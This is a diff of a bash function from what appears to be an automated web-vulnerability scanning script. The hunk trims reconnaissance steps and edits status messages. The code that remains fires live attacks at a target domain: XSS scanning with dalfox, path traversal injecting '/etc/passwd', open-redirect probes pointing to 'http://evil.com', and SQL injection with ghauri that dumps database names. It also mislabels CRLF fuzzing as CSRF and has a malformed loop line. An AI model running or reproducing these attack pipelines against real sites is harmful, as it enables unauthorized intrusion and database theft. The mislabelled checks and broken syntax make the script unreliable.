@@ -136,23 +136,15 @@ vuln2() {
 
 vuln3() {
 	echo -e "$RED$Custom Exploit Scan ${NC}"
-    echo -e "$CYAN$HTTP Scanning ${NC}"
-    httpx -silent -l output/$domain/subs.txt | anew output/$domain/alive.txt
 
-    echo -e "$CYANParameters search${NC}"
-    paramspider -l output/$domain/alive.txt && mv results output/$domain/
-    #cd results/
-    cat output/$domain/results/* > output/$domain/params.txt
-
-    echo -e "$RED${BOLD} \n Vulnerability Scanning \n${NC}"
     cat output/$domain/gxss_dump.txt | dalfox pipe -o cat output/$domain/VULN_xss.txt
-    [ -s output/$domain/VULN_xss.txt ] && echo -e "$green${BOLD} [+] VULN XSS [+] ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
+    [ -s output/$domain/VULN_xss.txt ] && echo -e "$green${BOLD} [+] VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
     echo -e "$CYAN${BOLD} \n [!] CSRF [!] \n${NC}"
     crlfuzz -l output/$domain/subs.txt -o output/$domain/VULN_csrf.txt
-    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] VULN CSRF [+] ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
+    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
 
     cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"'
-    cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31m Open Redir. Vulnerable\n" ;done
+    cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host $green${BOLD} Open Redir. Vulnerable\n" ;done
     cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch'
 }
 
